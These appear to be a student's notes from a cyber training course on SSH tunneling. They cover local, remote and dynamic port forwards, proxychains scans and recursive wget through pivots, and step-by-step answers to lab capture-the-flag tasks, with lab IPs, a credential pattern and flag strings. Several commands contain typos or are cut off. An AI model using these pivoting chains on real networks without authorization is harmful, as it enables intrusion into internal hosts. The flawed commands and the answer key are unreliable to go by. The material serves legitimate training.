              Internet_Host:
              proxychains ./scan.sh
              proxychains nmap -Pn 172.16.40.0/27 -p 21-23,80
              proxychains ssh student@172.16.40.10
              proxychains telnet 172.16.40.10
              proxychains wget -r http://172.16.40.10
              proxychains wget -r ftp://172.16.40.10
            Remember, the 'proxychains' command only forwards network traffic. If you were to simpy run a 'hostname' it would pull only the local_host IP address.
            You can run these commands ^ once you've opened up your SSH session. 
            It's VERY useful for running 'wgets'. 

          #SSH Dynamic Port Forwarding 2-Step#
              Internet_Host:
                ssh student@172.16.1.15 -L 2222:172.16.40.10:22 
                or
                ssh -L 2222:172.16.40.10:22 student@172.16.1.15
              Internet_Host:
                ssh student@localhost -p 2222 -D 9050
                or
                ssh -D 9050 student@localhost -p 2222
              (Note: You can run both the -D and -L ssh options with their commands together, but they can cause problems. not advised.)
              
          #SSH Dynamic Port Forwarding 2-Step#
              Internet_Host:
                proxychains ./scan.sh
                proxychains nmap -Pn 172.16.82.96/27 -p 21-23,80
                proxychains ssh student@172.16.82.106
                proxychains telnet 172.16.82.106
                proxychains wget -r http://172.16.82.106
                proxychains wget -r ftp://172.16.82.106

          #Remote Port Forwarding#
                ssh -p <optional alt port> <user>@<server ip> -R <remote bind port>:<tgt ip>:<tgt port>
                or
                ssh -R <remote bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<server ip>
          
            #Remote Port Forwarding from localhost of client#
              Blue_DMZ_Host-1:
                  ssh student@10.10.0.40 -R 4422:localhost:22
                  or
                  ssh -R 4422:localhost:22 student@10.10.0.40
              Internet_Host:
                  ssh student@localhost -p 4422
                  Blue_DMZ_Host-1~$
              Remote Port Forwarding from localhost of client:
                  https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html#_4_5_3_1_remote_port_forwarding_from_localhost_of_client
                
            #Remote Port Forwarding from localhost of client#
               Blue_DMZ_Host-1:
                  ssh student@10.10.0.40 -R 4423:localhost:23
                  or
                  ssh -R 4423:localhost:23 student@10.10.0.40
               Internet_Host:
                  telnet localhost 4423
                  Blue_DMZ_Host-1~$
            Remote Port Forwarding from localhost of client
                https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html#_4_5_3_1_remote_port_forwarding_from_localhost_of_client

            #Remote Port Forwarding from localhost of client#
                Blue_DMZ_Host-1:
                    ssh student@10.10.0.40 -R 4480:localhost:80
                    or
                    ssh -R 4480:localhost:80 student@10.10.0.40
                Internet_Host:
                    firefox http://localhost:4480
                    {Webpage of Blue_DMZ_Host-1}
                Remote Port Forwarding from localhost of client:
                    https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html#_4_5_3_1_remote_port_forwarding_from_localhost_of_client

            #Remote Port Forwarding to remote target via client#
                Blue_DMZ_Host-1:
                    ssh student@10.10.0.40 -R 5522:172.16.40.10:22
                    or
                    ssh -R 5522:172.16.40.10:22 student@10.10.0.40
                Internet_Host:
                    ssh student@localhost -p 5522
                    Blue_INT_DMZ_Host-1~$
                Remote Port Forwarding to remote target via client:
                    https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html#_4_5_3_2_remote_port_forwarding_to_remote_target_via_client

            #Remote Port Forwarding to remote target via client#
                Blue_DMZ_Host-1:
                    ssh student@10.10.0.40 -R 5523:172.16.40.10:23
                    or
                    ssh -R 5523:172.16.40.10:23 student@10.10.0.40
                Internet_Host:
                    telnet localhost 5523
                    Blue_INT_DMZ_Host-1~$
                Remote Port Forwarding to remote target via client:
                    https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html#_4_5_3_2_remote_port_forwarding_to_remote_target_via_client

              #Remote Port Forwarding to remote target via client#
                 Blue_DMZ_Host-1:
                    ssh student@10.10.0.40 -R 5580:172.16.40.10:80
                    or
                    ssh -R 5580:172.16.40.10:80 student@10.10.0.40
                Internet_Host:
                    firefox http://localhost:5580
                    {Webpage of Blue_INT_DMZ_Host-1}
                https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html#_4_5_3_2_remote_port_forwarding_to_remote_target_via_client


             #Combining Local and Remote Port Forwarding#
             
              #Bridging Local and Remote Port Forwarding#
                  Internet_Host:
                      ssh student@172.16.1.15 -L 2223:172.16.40.10:23
                      or
                      ssh -L 2223:172.16.40.10:23 student@172.16.1.15
                  Internet_Host:
                      telnet localhost 2223
                      Blue_INT_DMZ_Host-1~$

               #Bridging Local and Remote Port Forwarding#
                   Blue_INT_DMZ_Host-1:
                      ssh student@172.16.1.15 -R 1122:localhost:22
                      or
                      ssh -R 1122:localhost:22 student@172.16.1.15
                                          
              #Bridging Local and remote Port Forwarding#
                   Internet_Host:
                      ssh student@172.16.1.15 -L 2222:localhost:1122
                      or
                      ssh -L 2222:localhost:1122 student@172.16.1.15
  
              #Bridging Local and Remote Port Forwarding#
                  Internet_Host:
                      ssh student@localhost -p 2222 -D 9050
                      or
                      ssh -D 9050 student@localhost -p 2222
                  https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html#_4_5_4_1_bridging_local_and_remote_port_forwarding

              #Bridging Local and Remote Port Forwarding#
                  Internet_Host:
                  proxychains ./scan.sh
                  proxychains nmap -Pn -sT 172.16.82.96/27 -p 21-23,80
                  proxychains ssh student@172.16.82.106
                  proxychains telnet 172.16.82.106
                  proxychains wget -r http://172.16.82.106
                  proxychains wget -r ftp://172.16.82.106


              Perform SSH Practice (This is an example of what the instructor did looked like, for jumping through differing hosts using ssh tunneling.)
                1). Scan first pivot (use internet host to connect to float IP)
                2). First Pivot External Active Recon (See what ports are open)
                3). Enumerate first pivot (map it's details on your map. IPs, CIDRs, all those details you normally map). 
                4). Second scan pivot (see what ports are open on follow-on devices. Same as step 2-3).
                5). Enumerate second pivot.
                6). Scan third pivot
                7). Enumerate third pivot
                8). so on...
              See this link and follow on slides:
                https://net.cybbh.io/public/networking/latest/08_tunneling/fg.html#_4_6_perform_ssh_practice
              Provides a list of all commands you can use to practice. 
              
              WE WILL BE TESTED ON EVERY CONCEPT IN THIS DAYS WORK ^.   
               also, usr/share/CTCC. Look into this file to enumerate also.

  CTFs for Today:
Task 2 - Tunnels Prep: The_Only_Easy_Day_Was_Yesterday
Task 3 - Donovian Tunnels Training: dig_dug_dig_dug
    Your Network Number is N (Given by Instructor)
    Credentials: net{N}_studentX:passwordX
    X is your student number
    T3 (Atropia) Float IP address is - 10.50.27.164
    T4 (Pineland) Float IP address is - 10.50.29.131 (Note - You can only telnet here to act as an insider, this will not be a routed path)
Task 4 - Donovian Data Collection: Will open when Task 3 is complete
    T5 Float IP address is - 10.50.28.46
    Credentials: Same as Task 3.

#CTFS (task 2)#
(1.) Localhost is associated with both Loopback address and 127.0.0.1
(2.) 'OPS$ ssh cctc@10.50.1.150 -p 1111' port 1111 is the alternate ssh port on 10.50.1.150
(3.) 'OPS$ ssh cctc@localhost -p 1111' port 1111 is the local listening port on OPS
(4.) 'ssh cctc@10.50.1.150' 10.50.1.150 is the IP we use to ssh to PC1 from OPS.
(5.) 'ssh -D 9050 student@10.50.1.150' will set up a Dynamic tunnel to PC1
(6.) 'ssh -L 1111:localhost:22 cctc@10.50.1.150 -NT' this syntax will set up a Local tunnel to PC1's ssh port.
         (7.) 'ssh -D 9050 cctc@localhost -p 1111 -NT' This will create a dynamic tunnel using the local tunnel                      created in question 6 (dynamic port forward through previously established port forward).
               (8.) 'wget -r http://localhost:1111' This will allow you to download the webpage of PC1 using the                           local tunnel created in question 7 (you already have a tunnel open on port 1111 on the local 
                     host, that's why you can use localhost:1111)
                     (9.) 'proxychains wget -r http://100.1.1.2' This will allow you to download the webpage of PC2 
                           using the dynamic tunnel created in question 8.
        (12.) 'ssh ssh cctc@localhost -p 1111 -L 2222:100.1.1.2:22 -NT' This will set up a second local tunnel to                    PC2's ssh port usin the tunnel made in Question 6.
               (14.) 'ssh -D 9050 cctc@localhost -p 2222 -NT' This will create a dynamic tunnel using the local                             tunnel from question 12. 
               (17.) 'ssh -L 3333:192.168.1.2:23 cctc@localhost -p 2222'  This will allow you to use the tunnels in                           questions 6 & 12 to set up a 3rd local tunnel to PC3's telnet port. 
                     (18). 'telnet localhost               
               (20). 'ssh cctc@localhost 2222 -L 5555:localhost:4444' this will connect the Tunnel made in                                 Question 19 to the tunnels in question 6 & 12. The reason 5555:localhost:4444 makes sense 
                     here is because port 4444 was ultimately assigned to localhost. 
        (13.) 'ssh -L 2222:100.1.1.2:80 cctc@localhost -p 111' This will create a second local tunnel to PC2's HTTP 
              port using the tunnel mdae in Question 6. 
(10.) 'ssh cctc@10.50.1.150 -L 1111:100.1.1.2:22 -NT' This will set up a local tunnel to PC2 using PC1 as your pivot.
(11.) 'ssh cctc@10.50.1.150 -L 1111:100.1.1.2:22 -NT' This will allow me to open a local tunnel to PC2's ssh port using PC1 as my pivot.
(15.) The error is in line 2, where the user authenticates to the wrong IP address. The IP address to authenticate to should be the local host. 
(16.) The error is in line 1, where the user targeted the wrong IP. The correct Ip is 192.168.1.2.
(19.) 'ssh -R 4444:192.168.2.2:22 cctc@192.168.2.1 -NT' This will allow the user to set up a remote tunnel from PC3 back to PC2 using PC3s ssh port as the target. 

#CTFS (Task 3)#

(1.)  
[IH]   [T3]10.3.0.27:80         (T3 (Atropia) Float IP address is - 10.50.27.164)
terminal 2: internet_host$ ssh net1_student14@10.50.30.41 -L 1111:10.3.0.27:80 -NT (once ran, you will see no 
response.)
terminal 1: wget -r http://localhost:1111
   check to see the contents retrieved.
   cd into the new directory. 
   now cat the html to get the answer (answer is 6to4)
summary: This creates a local port forward from me (internet_host) to T3 that targets 10.3.0.27:80 

(2.)
[IH]    [T3]10.3.0.1 
Terminal 2: ssh -D 9050 net1_student14@10.50.27.164 -NT (the NT will prevent any responses of making it into the tgt)
Terminal 1: proxychians wget -r ftp://10.3.0.1
      check for contents received
      ls into new directory
      check the files (answer is injection)
summary: this creates a dynamic port forward from me (internet_host) to T3. 

(3.)
[IH]    [T4]10.50.29.131:23
Terminal 2: telnet 10.50.29.131 (use the net1_student14:password14 credentials to login)
    Once in, conduct passive recon.
    In this case, find a file that has a question for your flag. 
    find / -type f -name "*flag.txt" 2>/dev/null
    cat /usr/share/cctc/flag.txt      (this was the file found)
    (answer is ~/.ssh/known_hosts)
Summary: we access the target here using telnet. 

(4.)
[IH]10.50.30.41    [T3]Pivot,10.50.27.164:80    [T4]10.50.29.131
Terminal 2:  [IH]: telnet 10.50.29.131   
          
Terminal 4: ssh net1_student14@10.50.27.164
            ip a    (confirm the inside IP: 10.3.0.10)
            exit
Terminal 2:  [Pineland] ssh net1_student14@10.3.0.10 -R 11411:localhost:22 -NT
(create remote port forward to bind T3's inside IP to a local machine authorized port. This instance connects T3 to localhosts authorized port:22 )

Terminal 3: ssh net1_student14@10.50.27.164 -L 11422:localhost:11411 -NT
(This will create a local port forward from IH to T3 that targets the port we established in the first tunnel)
confirm this port is open by checking from the internal host by running ss -ntlp, to see if the port 11422 is open.)

Terminal 4: ssh net1_student14@localhost -p 11422 -L 11433:10.2.0.2:80 -NT
(this will set up a local port forwarder through through the port you most recently opened [11422] and connect it to a new port, [11433], and runs to 10.2.0.2:80.)

Terminal 1: wget -r http://localhost:11433
(This will connect you through the most recent opening of the tunnel to get to 10.2.0.2 and get you your answer.)

summary: we start by creating a Remote port forward tunnel from T4 to T3 binding the source as on of my authorized
ports from the mission prompt, and targetting 10.20.0.2:80 (by connecting to its inside IP). We then use another 
terminal to create a local port to connect T3's tunnel via port 11411 to the local host's port 11422.

# When in doubt with what your tunnels are doing, test them out. SSH net1_student14@local -p [port most recently opened]. Remember to pay attention to where you're opening new ports! example: ssh net1_student14@localhost -p 11422.

(5.)
[IH]     [T4]
Terminal 2: Continue off of the last local port set up at 11422 for the last question. 
          open a new terminal. 
Terminal 4: ssh net1_student14@localhost -p 11422 -D 9050 -NT
            (we connect to 11422 here because it's the last port that was able to touch 10.2.0.2)
Terminal 3: (or which ever terminal is open to use)
            proxychains nmap -T4 -vvvv 10.2.0.2     (see the ports open)
            proxychains wget -r ftp://10.2.0.2:21   (this will get you the file that holds the question. The answer is 
            /etc/ssh/ssh_config)

STEPS: set up tunnel 1: ssh net1_student14@10.3.0.10 -R 11411:localhost:22 -NT
              tunnel 2: ssh net1_student14@10.50.27.164 -L 11422:localhost:11411 -NT
              tunnel 3: ssh net1_student14@localhost -p 11422 -D 9050 -NT
              from IH: proxychains ./scan.sh
              This will get you the IPs/Ports open on the 10.2.0.0 Network. 
              We figured out from here that 10.3.0.10 can touch the 10.2.0.0 network. 
              
(6.)
terminal 2: continue from the last local port set up at 11422 in Question 4. 
Terminal 4: ssh net1_student14@10.50.27.164 -D 9050 -NT
Terminal 2: proxychains ./scan.sh    (this will scan for the ports, across a range of IPs, more quickly than nmap).
            Identify the IPs  that have an HTTP server (port 80 open)
            proxychains wget -r http://10.3.0.1:80 
            cd 10.3.0.1
            cat flag.txt (answer is: substitution)
            
(7.)
Terminal 2: from the last question (6). scan for the FTP server on T3. 
            proxychains ./scan.sh (start at 10.3.0 , start at 1 , end at 254 , 21-23 80 )
            proxychains wget -r ftp://10.3.0.27
            cat 10.3.0.27/flag.txt (answer is: Teredo)
(8.)
Terminal 4: Start by leaving the last dynamic tunnel you created, and reestablish the dynamic tunnel (was able to reach 10.2.0.0/24)
            STEPS:
              tunnel 1: ssh net1_student14@10.3.0.10 -R 11411:localhost:22 -NT
              tunnel 2: ssh net1_student14@10.50.27.164 -L 11422:localhost:11411 -NT
              tunnel 3: ssh net1_student14@localhost -p 11422 -D 9050 -NT
              from IH: proxychains ./scan.sh
              enumerate the results from the above and try to ssh into the networks found. 
              Telnet into T4 
              T4: ssh into the box it really is (10.2.0.3)
              look for hints. 
              find / -iname '*hint*' 
              cat /etc/share/cctc/hint.txt (says we used to have access to: 10.4.0.0/24 and 10.5.0.0/24)
              scan the networks found now.
            
              # Extend your tunnel
              Close out the above tunnel(s) ^
              Tunnel 1: ssh user@T3 -D 9050 -NT
                    IH: proxychains ./scan.sh (10.4.0.0/24 info 10.4.0.1 [baja-republic])
                        try to extend this tunnel to reach from 10.4.0.1.

              #Extend your tunnel once more
              Tunnel 1: ssh user@T3(pivot) -L 11411:10.4.0.1:22 -NT
              Tunnel 2: ssh usre@localhost -L 11411 -D 9050 -NT
                    IH: proxychains ./scan.sh (10.5.0.0/24 info)
                        (exit the ssh session)
                        proxychains wget -r ftp://10.5.0.1
                        cd 10.5.0.1
                        cat flag.txt (answer is: ssh-connect)

(9.)
              Tunnel 1: ssh user@T3(pivot) -L 11411:10.4.0.1:22 -NT
              Tunnel 2: ssh usre@localhost -L 11411 -D 9050 -NT    
                    Ih: proxychains wget -r http://10.5.0.1:80 
                        cat 10.5.0.1/index.html (answer is: SSH-TRANS)
(10). 
              Tunnel 1: ssh user@T3(pivot) -L 11411:10.4.0.1:22 -NT
              Tunnel 2: ssh usre@localhost -L 11411 -D 9050 -NT  
                    Ih: proxychains wget -r ftp://10.5.0.57
                        cat 10.5.0.57/flag.txt (answer is: 10.10.0.40)
(11).
              Tunnel 1: ssh user@T3(pivot) -L 11411:10.4.0.1:22 -NT
              Tunnel 2: ssh usre@localhost -L 11411 -D 9050 -NT 
                    Ih: proxychains wget -r http://10.5.0.57 
                        cat 10.5.0.57/index.html (answer is: 172.16.82.106)
(12).
                        
           

            
            

